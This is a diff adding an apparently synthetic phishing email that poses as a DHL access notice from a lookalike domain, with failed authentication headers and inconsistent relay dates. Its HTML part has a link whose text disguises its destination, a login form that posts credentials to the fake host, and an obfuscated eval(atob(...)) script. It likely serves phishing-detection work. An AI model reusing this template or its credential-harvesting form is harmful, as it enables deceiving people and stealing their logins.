@@ -1,0 +1,32 @@
+From: notice@dhl-verify.pages.dev
+To: victim13@example.com
+Subject: Access notice from DHL [ref FD2BE71]
+Date: Tue, 04 Mar 2002 08:46:00 -0500
+Message-ID: <phish-193-a10f9433-c1e0-41d7-8951-61bd00e9eba1@dhl-verify.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 06 Mar 2002 08:13:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 26 Mar 2002 05:12:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 26 Mar 2002 12:30:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 06 Mar 2002 18:47:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 15 Mar 2002 05:41:00 -0500
+Return-Path: <bounce@mail-84e1127b.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-84e1127b.top; dkim=fail header.d=dhl-verify.pages.dev; dmarc=fail header.from=dhl-verify.pages.dev
+Received-SPF: fail (mx.example.com: domain of notice@dhl-verify.pages.dev does not designate 198.51.100.24 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=dhl-verify.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-193-fd64b911"
+
+--bnd-p-193-fd64b911
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.dhl-verify.pages.dev/auth?t=FD2BE71
+
+Reference: FD2BE71
+--bnd-p-193-fd64b911
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.dhl-verify.pages.dev/auth?t=FD2BE71<br/><br/>Reference: FD2BE71</p><p><a href="http://dhl-verify.pages.dev/login">https://www.dhl.com/signin</a></p><form action="http://dhl-verify.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-193-fd64b911--
